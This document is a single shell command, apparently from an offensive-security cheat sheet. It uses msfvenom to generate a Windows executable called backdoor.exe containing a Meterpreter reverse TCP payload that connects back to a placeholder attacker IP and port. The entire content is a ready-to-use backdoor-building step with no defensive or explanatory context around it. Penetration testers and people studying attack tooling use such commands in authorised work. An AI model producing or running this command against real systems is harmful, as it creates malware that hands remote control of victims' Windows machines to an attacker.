
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe >backdoor.exe